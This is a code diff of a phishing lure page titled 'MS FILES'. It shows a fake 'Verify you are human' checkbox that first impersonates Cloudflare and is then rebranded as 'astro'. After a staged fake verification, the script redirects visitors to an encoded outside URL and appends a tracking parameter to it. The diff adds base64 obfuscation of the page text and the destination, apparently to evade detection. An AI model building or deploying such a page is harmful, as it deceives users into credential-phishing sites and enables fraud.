@@ -5,143 +5,149 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root { --main-hue: #4a6ee0; --success-hue: #28a745; --sans: 'Segoe UI', Roboto, sans-serif; }
-        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; font-family: var(--sans); overflow: hidden; }
+        /* Encapsulated Style Variables */
+        :root { --p-accent: #4a6ee0; --s-accent: #28a745; --f-stack: 'Segoe UI', Roboto, sans-serif; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: var(--f-stack); overflow: hidden; }
 
-        /* Splash Screen */
-        .overlay-screen {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: #f8f9fa; z-index: 100;
-            display: grid; place-items: center;
-            transition: opacity 400ms ease-in-out;
+        /* Initial Shield */
+        #stage-loader {
+            position: fixed; inset: 0; background: #f8f9fa; z-index: 999;
+            display: flex; align-items: center; justify-content: center;
+            transition: opacity 0.5s ease;
         }
+        .anim-element { width: 100px; filter: grayscale(20%); animation: pulse-node 1.8s infinite; }
+        @keyframes pulse-node { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
 
-        .spinner-img { width: 100px; filter: grayscale(20%); animation: heartbeat 1800ms infinite; }
-        @keyframes heartbeat { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
-
-        /* Main Content Container */
-        main {
+        /* Main Viewport */
+        #view-wrapper {
             width: 100%; max-width: 400px; margin: 0 auto; padding: 32px;
             display: flex; flex-direction: column; height: 80vh; justify-content: center;
-            opacity: 0; transform: translateY(15px); transition: opacity 0.8s, transform 0.8s;
+            opacity: 0; transform: translateY(15px); transition: 0.8s;
         }
+        .reveal #view-wrapper { opacity: 1; transform: translateY(0); }
 
-        .is-visible main { opacity: 1; transform: translateY(0); }
+        .desc-node { text-align: center; font-size: 17.6px; color: #1a1a1a; font-weight: 500; margin-bottom: 32px; line-height: 1.5; }
 
-        .instruction-text { text-align: center; font-size: 17.6px; color: #1a1a1a; font-weight: 500; margin-bottom: 32px; line-height: 1.5; }
-
-        /* Verification Box */
-        .v-card {
+        /* Validation UI */
+        .plate {
             background: #fbfbfb; border: 1px solid #e0e0e0; border-radius: 12px; height: 40px;
             padding: 35px 22px; display: flex; align-items: center; justify-content: space-between;
             box-shadow: 0 2px 5px rgba(0,0,0,0.02);
         }
+        .plate-left { display: flex; align-items: center; gap: 19px; }
 
-        .v-left-side { display: flex; align-items: center; gap: 19px; }
-
-        .checkbox-ui {
-            width: 20px; height: 20px; border: 2.5px solid var(--main-hue); border-radius: 5px;
-            cursor: pointer; position: relative; transition: 300ms ease;
+        .box-trigger {
+            width: 20px; height: 20px; border: 2.5px solid var(--p-accent); border-radius: 5px;
+            cursor: pointer; position: relative; transition: 300ms;
         }
 
-        .is-loading { border-radius: 50%; border-color: #ddd; border-top-color: var(--main-hue); animation: spin-loader 0.8s linear infinite; }
-        .is-complete { background: var(--success-hue); border-color: var(--success-hue); }
-        .is-complete::before { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
+        /* Logic States */
+        .waiting { border-radius: 50%; border-color: #ddd; border-top-color: var(--p-accent); animation: rot-node 0.8s linear infinite; }
+        .success { background: var(--s-accent); border-color: var(--s-accent); }
+        .success::after { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
 
-        @keyframes spin-loader { 100% { transform: rotate(360deg); } }
+        @keyframes rot-node { 100% { transform: rotate(360deg); } }
 
-        .vendor-info { text-align: right; font-size: 11px; color: #888; }
-        .vendor-info img { width: 28px; margin-bottom: 4px; }
-        .vendor-info strong { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }
+        .sub-sec { text-align: right; font-size: 11px; color: #888; }
+        .sub-sec img { width: 28px; margin-bottom: 4px; }
+        .sub-sec b { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }
 
-        .bottom-anchor {
+        .footer-pin {
             position: absolute; bottom: 25px; width: 100%; text-align: center;
             font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 7px;
         }
-
-        .shield-svg { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
+        .glyph { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
     </style>
 </head>
-<body>
+<body id="context-body">
 
-    <div class="overlay-screen" id="gatekeeper">
-        <img src="astro.png" class="spinner-img">
+    <div id="stage-loader">
+        <img src="astro.png" class="anim-element">
     </div>
 
-    <main>
-        <h1 class="instruction-text">Verify you are human by completing the action below to view attachment</h1>
+    <div id="view-wrapper">
+        <h1 class="desc-node" id="msg-01"></h1>
 
-        <div class="v-card">
-            <div class="v-left-side">
-                <div id="actionBtn" class="checkbox-ui"></div>
-                <span id="statusTxt" style="font-weight: 600; color: #333; letter-spacing: -0.2px;">Verify</span>
+        <div class="plate">
+            <div class="plate-left">
+                <div id="interact-box" class="box-trigger"></div>
+                <span id="msg-02" style="font-weight: 600; color: #333; letter-spacing: -0.2px;"></span>
             </div>
 
-            <div class="vendor-info">
-                <img src="cloudflare_.png">
-                <strong>CLOUDFLARE</strong>
+            <div class="sub-sec">
+                <img src="astro_.png">
+                <b>astro</b>
                 Privacy &middot; Terms
             </div>
         </div>
-    </main>
+    </div>
 
-    <div class="bottom-anchor">
-        <div class="shield-svg"></div>
-        Protected by CLOUDFLARE
+    <div class="footer-pin">
+        <div class="glyph"></div>
+        Protected by astro
     </div>
 
     <script>
-        (function(win, doc) {
+        (function() {
             "use strict";
 
-            // Encoded target bits
-            const sequence = [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53];
-            const delays = { intro: 1300, process: 1600, redirect: 800 };
-            let locked = false;
-
-            // Page Initialization
-            win.onload = function() {
-                setTimeout(() => {
-                    const gate = doc.getElementById('gatekeeper');
-                    gate.style.opacity = '0';
-                    setTimeout(() => {
-                        gate.style.display = 'none';
-                        doc.body.className = 'is-visible';
-                    }, 400);
-                }, delays.intro);
+            // Obfuscated Content Map (Base64)
+            const CONTENT = {
+                t1: "VmVyaWZ5IHlvdSBhcmUgaHVtYW4gYnkgY29tcGxldGluZyB0aGUgYWN0aW9uIGJlbG93IHRvIHZpZXcgYXR0YWNobWVudA==", // Verify text
+                t2: "VmVyaWZ5", // Verify
+                t3: "UHJvY2Vzc2luZy4uLg==", // Processing...
+                t4: "VmVyaWZpZWQ=", // Verified
+                // Target URL: https://po.blanread.info/s/1qyzx7XI7ojXNxIhgbO
+                dest: "aHR0cHM6Ly9wby5ibGFucmVhZC5pbmZvL3MvMXF5eng3WEk3b2pYTnhJaGdiTw=="
             };
 
-            // Logic Handler
-            async function handleVerification() {
-                if (locked) return;
-                locked = true;
+            const decode = (str) => atob(str);
+            let activeState = false;
 
-                const trigger = doc.getElementById('actionBtn');
-                const label = doc.getElementById('statusTxt');
+            // Load texts dynamically
+            document.getElementById('msg-01').textContent = decode(CONTENT.t1);
+            document.getElementById('msg-02').textContent = decode(CONTENT.t2);
 
-                // Visual phase 1: Loading
-                label.innerText = "Processing...";
-                trigger.classList.add('is-loading');
-
-                await new Promise(resolve => setTimeout(resolve, delays.process));
-
-                // Visual phase 2: Success
-                trigger.classList.remove('is-loading');
-                trigger.classList.add('is-complete');
-                label.innerText = "Verified";
-
-                // Final phase: Redirection
+            // Startup Sequence
+            window.addEventListener('load', () => {
                 setTimeout(() => {
-                    const destination = sequence.map(code => String.fromCharCode(code)).join('');
-                    const query = new URLSearchParams(win.location.search).get('eoff');
+                    const gate = document.getElementById('stage-loader');
+                    gate.style.opacity = '0';
+                    setTimeout(() => {
+                        gate.remove();
+                        document.getElementById('context-body').classList.add('reveal');
+                    }, 500);
+                }, 1300);
+            });
 
-                    win.location.replace(query ? `${destination}#${query}` : destination);
-                }, delays.redirect);
-            }
+            // Action Execution
+            const runVerification = async () => {
+                if (activeState) return;
+                activeState = true;
 
-            doc.getElementById('actionBtn').addEventListener('click', handleVerification);
+                const box = document.getElementById('interact-box');
+                const label = document.getElementById('msg-02');
 
-        })(window, document);
+                label.textContent = decode(CONTENT.t3);
+                box.classList.add('waiting');
+
+                await new Promise(r => setTimeout(r, 1600));
+
+                box.classList.remove('waiting');
+                box.classList.add('success');
+                label.textContent = decode(CONTENT.t4);
+
+                setTimeout(() => {
+                    const target = decode(CONTENT.dest);
+                    const hash = new URLSearchParams(window.location.search).get('eoff');
+
+                    window.location.replace(hash ? `${target}#${hash}` : target);
+                }, 800);
+            };
+
+            document.getElementById('interact-box').addEventListener('click', runVerification);
+
+        })();
     </script>
 </body>
 </html>
